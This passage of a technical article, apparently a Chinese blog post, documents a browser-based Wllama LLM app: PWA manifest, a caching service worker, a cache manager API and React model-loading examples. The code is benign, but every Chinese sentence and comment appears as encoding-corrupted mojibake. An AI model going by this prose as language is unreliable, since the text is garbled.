<span class="hljs-keyword">await</span> wllamaCoreFactory.<span class="hljs-title function_">destroyAll</span>();
</code></pre>
<p><strong>å…³é”®ç‰¹æ€§</strong>ï¼š</p>
<ul>
<li><strong>å®ä¾‹éš”ç¦»</strong>ï¼šæ¯ä¸ªå®ä¾‹çš„æ¨ç†å‚æ•°å­˜å‚¨åœ¨ç‹¬ç«‹çš„ localStorage é”®ä¸­ï¼ˆæ ¼å¼ï¼š<code>params-{instanceId}</code>ï¼‰</li>
<li><strong>äº‹ä»¶éš”ç¦»</strong>ï¼šæ¯ä¸ªå®ä¾‹çš„äº‹ä»¶ç›‘å¬å™¨ç‹¬ç«‹ï¼Œäº‹ä»¶æ•°æ®åŒ…å« <code>instanceId</code> ç”¨äºåŒºåˆ†</li>
<li><strong>èµ„æºç®¡ç†</strong>ï¼šé€šè¿‡å·¥å‚ç±»ç»Ÿä¸€ç®¡ç†æ‰€æœ‰å®ä¾‹ï¼Œæ”¯æŒè·å–ã€åˆ›å»ºã€é”€æ¯ç­‰æ“ä½œ</li>
<li><strong>å‘åå…¼å®¹</strong>ï¼šåŸæœ‰çš„ç›´æ¥åˆ›å»º <code>WllamaCore</code> å®ä¾‹çš„æ–¹å¼ä»ç„¶æ”¯æŒ</li>
</ul>
<h3 data-id="heading-21">6. PWA æ”¯æŒ</h3>
<p>é¡¹ç›®å®Œæ•´æ”¯æŒæ¸è¿›å¼ Web åº”ç”¨ï¼ˆPWAï¼‰ï¼Œç”¨æˆ·å¯ä»¥åƒåŸç”Ÿåº”ç”¨ä¸€æ ·å®‰è£…å’Œä½¿ç”¨ï¼š</p>
<p><strong>æ ¸å¿ƒç‰¹æ€§</strong>ï¼š</p>
<ul>
<li><strong>å¯å®‰è£…æ€§</strong>ï¼šæ”¯æŒæ·»åŠ åˆ°ä¸»å±å¹•ï¼Œæä¾›åŸç”Ÿåº”ç”¨ä½“éªŒ</li>
<li><strong>ç¦»çº¿æ”¯æŒ</strong>ï¼šé€šè¿‡ Service Worker å®ç°ç¦»çº¿è®¿é—®</li>
<li><strong>æ™ºèƒ½ç¼“å­˜</strong>ï¼šè‡ªåŠ¨ç¼“å­˜åº”ç”¨èµ„æºï¼Œæå‡åŠ è½½é€Ÿåº¦</li>
<li><strong>è‡ªåŠ¨æ›´æ–°</strong>ï¼šService Worker è‡ªåŠ¨æ£€æµ‹å¹¶æ›´æ–°åº”ç”¨</li>
</ul>
<p><strong>manifest.json é…ç½®</strong>ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"MVP AI Wllama"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"short_name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Wllama"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"AI Wllama Application"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"start_url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"display"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"standalone"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"background_color"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"#ffffff"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"theme_color"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"#000000"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"orientation"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"portrait-primary"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"icons"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"src"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/icon-192.png"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"sizes"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"192x192"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"image/png"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"purpose"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"any maskable"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"src"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/icon-512.png"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"sizes"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"512x512"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"image/png"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"purpose"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"any maskable"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>Service Worker å®ç°</strong>ï¼š</p>
<p>é¡¹ç›®å®ç°äº†æ™ºèƒ½çš„ Service Workerï¼Œæ”¯æŒï¼š</p>
<ul>
<li><strong>èµ„æºç¼“å­˜</strong>ï¼šè‡ªåŠ¨ç¼“å­˜åº”ç”¨é¡µé¢å’Œé™æ€èµ„æº</li>
<li><strong>ç¦»çº¿å›é€€</strong>ï¼šç½‘ç»œä¸å¯ç”¨æ—¶ä½¿ç”¨ç¼“å­˜å†…å®¹</li>
<li><strong>åå°æ›´æ–°</strong>ï¼šåå°è‡ªåŠ¨æ›´æ–°ç¼“å­˜ï¼Œä¸é˜»å¡ç”¨æˆ·æ“ä½œ</li>
<li><strong>å¿«é€Ÿå¤±è´¥</strong>ï¼šç½‘ç»œè¯·æ±‚è¶…æ—¶å¿«é€Ÿå¤±è´¥ï¼Œé¿å…é•¿æ—¶é—´ç­‰å¾…</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// public/sw.js</span>

<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CACHE_NAME</span> = <span class="hljs-string">'wllama-cache-v1'</span>;

<span class="hljs-comment">// å®‰è£…æ—¶ç«‹å³æ¿€æ´»</span>
self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'install'</span>, <span class="hljs-function">() =&gt;</span> self.<span class="hljs-title function_">skipWaiting</span>());

<span class="hljs-comment">// æ¿€æ´»æ—¶æ¸…ç†æ—§ç¼“å­˜</span>
self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'activate'</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
  event.<span class="hljs-title function_">waitUntil</span>(
    caches.<span class="hljs-title function_">keys</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">names</span>) =&gt;</span>
      <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(names.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">n</span>) =&gt;</span> n !== <span class="hljs-variable constant_">CACHE_NAME</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">n</span>) =&gt;</span> caches.<span class="hljs-title function_">delete</span>(n)))
    ).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> self.<span class="hljs-property">clients</span>.<span class="hljs-title function_">claim</span>())
  );
});

<span class="hljs-comment">// æ‹¦æˆªç½‘ç»œè¯·æ±‚ï¼Œå®ç°ç¼“å­˜ç­–ç•¥</span>
self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'fetch'</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
  <span class="hljs-comment">// ç¼“å­˜ä¼˜å…ˆç­–ç•¥ï¼šä¼˜å…ˆä½¿ç”¨ç¼“å­˜ï¼Œåå°æ›´æ–°</span>
  event.<span class="hljs-title function_">respondWith</span>(
    (<span class="hljs-keyword">async</span> () =&gt; {
      <span class="hljs-keyword">const</span> cache = <span class="hljs-keyword">await</span> caches.<span class="hljs-title function_">open</span>(<span class="hljs-variable constant_">CACHE_NAME</span>);
      <span class="hljs-keyword">const</span> cached = <span class="hljs-keyword">await</span> cache.<span class="hljs-title function_">match</span>(event.<span class="hljs-property">request</span>);
      
      <span class="hljs-keyword">if</span> (cached) {
        <span class="hljs-comment">// æœ‰ç¼“å­˜ï¼šç«‹å³è¿”å›ï¼Œåå°æ›´æ–°</span>
        event.<span class="hljs-title function_">waitUntil</span>(
          <span class="hljs-title function_">fetch</span>(event.<span class="hljs-property">request</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> {
            <span class="hljs-keyword">if</span> (res?.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) {
              <span class="hljs-keyword">return</span> cache.<span class="hljs-title function_">put</span>(event.<span class="hljs-property">request</span>, res.<span class="hljs-title function_">clone</span>());
            }
          }).<span class="hljs-keyword">catch</span>(<span class="hljs-function">() =&gt;</span> {})
        );
        <span class="hljs-keyword">return</span> cached;
      }
      
      <span class="hljs-comment">// æ— ç¼“å­˜ï¼šç½‘ç»œè¯·æ±‚</span>
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(event.<span class="hljs-property">request</span>);
        <span class="hljs-keyword">if</span> (res?.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) {
          event.<span class="hljs-title function_">waitUntil</span>(cache.<span class="hljs-title function_">put</span>(event.<span class="hljs-property">request</span>, res.<span class="hljs-title function_">clone</span>()));
        }
        <span class="hljs-keyword">return</span> res;
      } <span class="hljs-keyword">catch</span> {
        <span class="hljs-comment">// ç½‘ç»œå¤±è´¥ï¼šè¿”å›ç¼“å­˜æˆ–ç©ºå“åº”</span>
        <span class="hljs-keyword">return</span> cached || <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(<span class="hljs-string">''</span>, { <span class="hljs-attr">status</span>: <span class="hljs-number">503</span> });
      }
    })()
  );
});
</code></pre>
<p><strong>Service Worker ç®¡ç†</strong>ï¼š</p>
<p>é¡¹ç›®æä¾›äº†æ™ºèƒ½çš„ Service Worker ç®¡ç†ç»„ä»¶ï¼Œåªåœ¨ PWA ç¯å¢ƒä¸‹æ³¨å†Œï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/components/ServiceWorkerManager.tsx</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">ServiceWorkerManager</span>(<span class="hljs-params">{ swPath = <span class="hljs-string">'/sw.js'</span> }</span>) {
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (!(<span class="hljs-string">'serviceWorker'</span> <span class="hljs-keyword">in</span> navigator)) <span class="hljs-keyword">return</span>;

    <span class="hljs-keyword">const</span> <span class="hljs-title function_">isPWA</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">matchMedia</span>(<span class="hljs-string">'(display-mode: standalone)'</span>).<span class="hljs-property">matches</span> ||
             <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">matchMedia</span>(<span class="hljs-string">'(display-mode: minimal-ui)'</span>).<span class="hljs-property">matches</span> ||
             (<span class="hljs-variable language_">window</span>.<span class="hljs-property">navigator</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>).<span class="hljs-property">standalone</span> === <span class="hljs-literal">true</span>;
    };

    <span class="hljs-keyword">const</span> <span class="hljs-title function_">checkAndManageSW</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-keyword">const</span> existingReg = <span class="hljs-keyword">await</span> navigator.<span class="hljs-property">serviceWorker</span>.<span class="hljs-title function_">getRegistration</span>();
      <span class="hljs-keyword">const</span> currentIsPWA = <span class="hljs-title function_">isPWA</span>();

      <span class="hljs-comment">// åªåœ¨ PWA ç¯å¢ƒæ³¨å†Œ Service Worker</span>
      <span class="hljs-keyword">if</span> (currentIsPWA &amp;&amp; !existingReg) {
        <span class="hljs-keyword">const</span> reg = <span class="hljs-keyword">await</span> navigator.<span class="hljs-property">serviceWorker</span>.<span class="hljs-title function_">register</span>(swPath);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Service Worker æ³¨å†ŒæˆåŠŸï¼ˆPWA ç¯å¢ƒï¼‰'</span>);
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!currentIsPWA &amp;&amp; existingReg) {
        <span class="hljs-comment">// ä¸åœ¨ PWA ç¯å¢ƒæ—¶å¸è½½</span>
        <span class="hljs-keyword">await</span> existingReg.<span class="hljs-title function_">unregister</span>();
        <span class="hljs-keyword">const</span> cacheNames = <span class="hljs-keyword">await</span> caches.<span class="hljs-title function_">keys</span>();
        <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(cacheNames.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span> caches.<span class="hljs-title function_">delete</span>(name)));
      }
    };

    <span class="hljs-title function_">checkAndManageSW</span>();
  }, [swPath]);
}
</code></pre>
<p><strong>ä½¿ç”¨æ–¹å¼</strong>ï¼š</p>
<ol>
<li>
<p><strong>å®‰è£…åº”ç”¨</strong>ï¼š</p>
<ul>
<li>åœ¨æ”¯æŒçš„æµè§ˆå™¨ä¸­è®¿é—®åº”ç”¨</li>
<li>æµè§ˆå™¨ä¼šæ˜¾ç¤º"æ·»åŠ åˆ°ä¸»å±å¹•"æç¤º</li>
<li>ç‚¹å‡»å®‰è£…åï¼Œåº”ç”¨ä¼šåƒåŸç”Ÿåº”ç”¨ä¸€æ ·è¿è¡Œ</li>
</ul>
</li>
<li>
<p><strong>ç¦»çº¿ä½¿ç”¨</strong>ï¼š</p>
<ul>
<li>å®‰è£…åï¼Œåº”ç”¨çš„æ ¸å¿ƒåŠŸèƒ½å¯ä»¥åœ¨ç¦»çº¿çŠ¶æ€ä¸‹ä½¿ç”¨</li>
<li>Service Worker ä¼šè‡ªåŠ¨ç¼“å­˜è®¿é—®è¿‡çš„é¡µé¢</li>
<li>æ¨¡å‹æ–‡ä»¶å­˜å‚¨åœ¨ IndexedDB ä¸­ï¼Œç¦»çº¿æ—¶ä»å¯ä½¿ç”¨</li>
</ul>
</li>
<li>
<p><strong>è‡ªåŠ¨æ›´æ–°</strong>ï¼š</p>
<ul>
<li>Service Worker ä¼šè‡ªåŠ¨æ£€æµ‹æ–°ç‰ˆæœ¬</li>
<li>åå°æ›´æ–°ç¼“å­˜ï¼Œä¸å½±å“å½“å‰ä½¿ç”¨</li>
<li>ä¸‹æ¬¡æ‰“å¼€åº”ç”¨æ—¶ä¼šä½¿ç”¨æ–°ç‰ˆæœ¬</li>
</ul>
</li>
</ol>
<p><strong>æ³¨æ„äº‹é¡¹</strong>ï¼š</p>
<ul>
<li>PWA åŠŸèƒ½éœ€è¦åœ¨ HTTPS ç¯å¢ƒä¸‹è¿è¡Œï¼ˆæˆ– localhostï¼‰</li>
<li>Service Worker åªåœ¨ PWA æ¨¡å¼ä¸‹æ³¨å†Œï¼Œé¿å…åœ¨æ™®é€šæµè§ˆå™¨ä¸­å ç”¨èµ„æº</li>
<li>æ¨¡å‹æ–‡ä»¶ç¼“å­˜ä½¿ç”¨ IndexedDBï¼Œä¸ Service Worker ç¼“å­˜åˆ†ç¦»</li>
<li>æ”¯æŒæ‰‹åŠ¨å¸è½½ Service Workerï¼ˆé€šè¿‡ ServiceWorkerUninstall ç»„ä»¶ï¼‰</li>
</ul>
<h3 data-id="heading-22">7. ç¼“å­˜ç®¡ç†åŠŸèƒ½</h3>
<p>å®Œæ•´çš„ç¼“å­˜ç®¡ç†ç³»ç»Ÿï¼Œæ”¯æŒå¯¼å…¥ã€å¯¼å‡ºã€åˆ é™¤ç­‰æ“ä½œï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { cacheManager, toHumanReadableSize } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/wllama-core'</span>;

<span class="hljs-comment">// åˆ—å‡ºæ‰€æœ‰ç¼“å­˜æ–‡ä»¶</span>
<span class="hljs-keyword">const</span> entries = <span class="hljs-keyword">await</span> cacheManager.<span class="hljs-title function_">list</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ç¼“å­˜æ–‡ä»¶æ•°: <span class="hljs-subst">${entries.length}</span>`</span>);
entries.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">entry</span> =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${entry.metadata.originalURL || entry.name}</span>: <span class="hljs-subst">${toHumanReadableSize(entry.size)}</span>`</span>);
});

<span class="hljs-comment">// è·å–ç¼“å­˜æ€»å¤§å°</span>
<span class="hljs-keyword">const</span> totalSize = entries.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">sum, entry</span>) =&gt;</span> sum + entry.<span class="hljs-property">size</span>, <span class="hljs-number">0</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æ€»å¤§å°: <span class="hljs-subst">${toHumanReadableSize(totalSize)}</span>`</span>);

<span class="hljs-comment">// åˆ é™¤ç‰¹å®šæ–‡ä»¶</span>
<span class="hljs-keyword">await</span> cacheManager.<span class="hljs-title function_">delete</span>(<span class="hljs-string">'https://example.com/model.gguf'</span>);

<span class="hljs-comment">// æ¸…ç©ºæ‰€æœ‰ç¼“å­˜</span>
<span class="hljs-keyword">await</span> cacheManager.<span class="hljs-title function_">clear</span>();

<span class="hljs-comment">// ä»æ–‡ä»¶å¯¼å…¥åˆ°ç¼“å­˜</span>
<span class="hljs-keyword">const</span> fileInput = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'input[type="file"]'</span>) <span class="hljs-keyword">as</span> <span class="hljs-title class_">HTMLInputElement</span>;
<span class="hljs-keyword">const</span> file = fileInput.<span class="hljs-property">files</span>?.[<span class="hljs-number">0</span>];
<span class="hljs-keyword">if</span> (file) {
  <span class="hljs-keyword">await</span> cacheManager.<span class="hljs-title function_">write</span>(<span class="hljs-string">`/<span class="hljs-subst">${file.name}</span>`</span>, file, {
    <span class="hljs-attr">etag</span>: <span class="hljs-string">''</span>,
    <span class="hljs-attr">originalSize</span>: file.<span class="hljs-property">size</span>,
    <span class="hljs-attr">originalURL</span>: <span class="hljs-string">`/<span class="hljs-subst">${file.name}</span>`</span>,
  });
}
</code></pre>
<h2 data-id="heading-23">ä½¿ç”¨ç¤ºä¾‹</h2>
<h3 data-id="heading-24">åŸºæœ¬ä½¿ç”¨ï¼ˆReactç»„ä»¶ï¼‰</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/app/wllama/load-from-file/page.tsx</span>
<span class="hljs-string">"use client"</span>
<span class="hljs-keyword">import</span> { useState, useRef, useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">WllamaCore</span>, <span class="hljs-title class_">Message</span>, <span class="hljs-variable constant_">WLLAMA_CONFIG_PATHS</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/wllama-core'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">MinimalExample</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [messages, setMessages] = useState&lt;<span class="hljs-title class_">Message</span>[]&gt;([]);
  <span class="hljs-keyword">const</span> [input, setInput] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">''</span>);
  <span class="hljs-keyword">const</span> [isModelLoaded, setIsModelLoaded] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);
  <span class="hljs-keyword">const</span> wllamaCoreRef = useRef&lt;<span class="hljs-title class_">WllamaCore</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    wllamaCoreRef.<span class="hljs-property">current</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WllamaCore</span>({ <span class="hljs-attr">paths</span>: <span class="hljs-variable constant_">WLLAMA_CONFIG_PATHS</span> });
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      wllamaCoreRef.<span class="hljs-property">current</span>?.<span class="hljs-title function_">unloadModel</span>().<span class="hljs-keyword">catch</span>(<span class="hljs-function">() =&gt;</span> {});
    };
  }, []);

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">loadModel</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">e: React.ChangeEvent&lt;HTMLInputElement&gt;</span>) =&gt; {
    <span class="hljs-keyword">const</span> files = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(e.<span class="hljs-property">target</span>.<span class="hljs-property">files</span> || []);
    <span class="hljs-keyword">if</span> (!files.<span class="hljs-property">length</span> || !wllamaCoreRef.<span class="hljs-property">current</span>) <span class="hljs-keyword">return</span>;
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> wllamaCoreRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">loadModelFromFiles</span>(files, { 
        <span class="hljs-attr">n_ctx</span>: <span class="hljs-number">4096</span>, 
        <span class="hljs-attr">n_batch</span>: <span class="hljs-number">128</span> 
      });
      <span class="hljs-title function_">setIsModelLoaded</span>(<span class="hljs-literal">true</span>);
    } <span class="hljs-keyword">catch</span> (err) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'åŠ è½½å¤±è´¥:'</span>, err);
    }
  };

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">send</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">if</span> (!input.<span class="hljs-title function_">trim</span>() || !wllamaCoreRef.<span class="hljs-property">current</span> || !isModelLoaded) <span class="hljs-keyword">return</span>;

    <span class="hljs-keyword">const</span> <span class="hljs-attr">userMsg</span>: <span class="hljs-title class_">Message</span> = { <span class="hljs-attr">role</span>: <span class="hljs-string">'user'</span>, <span class="hljs-attr">content</span>: input.<span class="hljs-title function_">trim</span>() };
    <span class="hljs-keyword">const</span> <span class="hljs-attr">assistantMsg</span>: <span class="hljs-title class_">Message</span> = { <span class="hljs-attr">role</span>: <span class="hljs-string">'assistant'</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">''</span> };
    <span class="hljs-title function_">setMessages</span>(<span class="hljs-function">(<span class="hljs-params">prev</span>) =&gt;</span> [...prev, userMsg, assistantMsg]);
    <span class="hljs-title function_">setInput</span>(<span class="hljs-string">''</span>);

    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> wllamaCoreRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">createChatCompletion</span>(
        [...messages, userMsg], 
        {
          <span class="hljs-attr">nPredict</span>: <span class="hljs-number">4096</span>,
          <span class="hljs-attr">useCache</span>: <span class="hljs-literal">true</span>,
          <span class="hljs-attr">sampling</span>: { <span class="hljs-attr">temp</span>: <span class="hljs-number">0.2</span> },
          <span class="hljs-title function_">onNewToken</span>(<span class="hljs-params">_token, _piece, text</span>) {
            <span class="hljs-title function_">setMessages</span>(<span class="hljs-function">(<span class="hljs-params">prev</span>) =&gt;</span> {
              <span class="hljs-keyword">const</span> updated = [...prev];
              <span class="hljs-keyword">if</span> (updated.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span> &amp;&amp; updated[updated.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>].<span class="hljs-property">role</span> === <span class="hljs-string">'assistant'</span>) {
                updated[updated.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>].<span class="hljs-property">content</span> = text;
              }
              <span class="hljs-keyword">return</span> updated;
            });
          },
        }
      );
    } <span class="hljs-keyword">catch</span> (err) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'ç”Ÿæˆå¤±è´¥:'</span>, err);
    }
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">accept</span>=<span class="hljs-string">".gguf"</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">{loadModel}</span> /&gt;</span>
      {/* UIç»„ä»¶... */}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<h3 data-id="heading-25">ä»URLåŠ è½½ï¼ˆè‡ªåŠ¨ç¼“å­˜ï¼‰</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ä»URLåŠ è½½æ¨¡å‹ï¼Œè‡ªåŠ¨ç¼“å­˜åˆ°IndexedDB</span>
<span class="hljs-keyword">await</span> wllamaCore.<span class="hljs-title function_">loadModelFromUrl</span>(<span class="hljs-string">'https://example.com/model.gguf'</span>, {
  <span class="hljs-attr">n_ctx</span>: <span class="hljs-number">4096</span>,
  <span class="hljs-attr">useCache</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// é»˜è®¤å¯ç”¨</span>
  <span class="hljs-attr">downloadOptions</span>: {
    <span class="hljs-attr">progressCallback</span>: <span class="hljs-function">(<span class="hljs-params">progress</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> percent = progress.<span class="hljs-property">total</span> &gt; <span class="hljs-number">0</span> 
        ? (progress.<span class="hljs-property">loaded</span> / progress.<span class="hljs-property">total</span>) * <span class="hljs-number">100</span> 
        : <span class="hljs-number">0</span>;
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ä¸‹è½½è¿›åº¦: <span class="hljs-subst">${percent.toFixed(<span class="hljs-number">1</span>)}</span>%`</span>);
    },
  },
});

<span class="hljs-comment">// ä¸‹æ¬¡åŠ è½½æ—¶ï¼Œä¼šè‡ªåŠ¨ä»ç¼“å­˜è¯»å–ï¼Œæ— éœ€é‡æ–°ä¸‹è½½</span>
<span class="hljs-keyword">await</span> wllamaCore.<span class="hljs-title function_">loadModelFromUrl</span>(<span class="hljs-string">'https://example.com/model.gguf'</span>, {
  <span class="hljs-attr">n_ctx</span>: <span class="hljs-number">4096</span>,
  <span class="hljs-comment">// useCache: true æ˜¯é»˜è®¤å€¼</span>
});
</code></pre>
<h3 data-id="heading-26">äº‹ä»¶ç›‘å¬</h3>
<pre><code class="hljs language-typescript" lang="typescript">wllamaCore.<span class="hljs-title function_">on</span>(<span class="hljs-title class_">WllamaCoreEvent</span>.<span class="hljs-property">MODEL_LOADING</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ¨¡å‹åŠ è½½ä¸­...'</span>);
});

wllamaCore.<span class="hljs-title function_">on</span>(<span class="hljs-title class_">WllamaCoreEvent</span>.<span class="hljs-property">MODEL_LOADED</span>, <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> { metadata, runtimeInfo } = data <span class="hljs-keyword">as</span> {
    metadata?: <span class="hljs-title class_">ModelMetadata</span>;
    runtimeInfo?: <span class="hljs-title class_">RuntimeInfo</span>;
  };
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ¨¡å‹å·²åŠ è½½:'</span>, metadata?.<span class="hljs-property">name</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å¤šçº¿ç¨‹æ¨¡å¼:'</span>, runtimeInfo?.<span class="hljs-property">isMultithread</span>);
});

wllamaCore.<span class="hljs-title function_">on</span>(<span class="hljs-title class_">WllamaCoreEvent</span>.<span class="hljs-property">GENERATION_UPDATE</span>, <span class="hljs-function">(<span class="hljs-params">text</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ç”Ÿæˆä¸­:'</span>, text <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>);
});

wllamaCore.<span class="hljs-title function_">on</span>(<span class="hljs-title class_">WllamaCoreEvent</span>.<span class="hljs-property">ERROR</span>, <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'é”™è¯¯:'</span>, error <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>);
});
</code></pre>
<h3 data-id="heading-27">å¤šå®ä¾‹ä½¿ç”¨</h3>
<p>ä½¿ç”¨å·¥å‚ç±»åˆ›å»ºå’Œç®¡ç†å¤šä¸ªå®ä¾‹ï¼š</p>
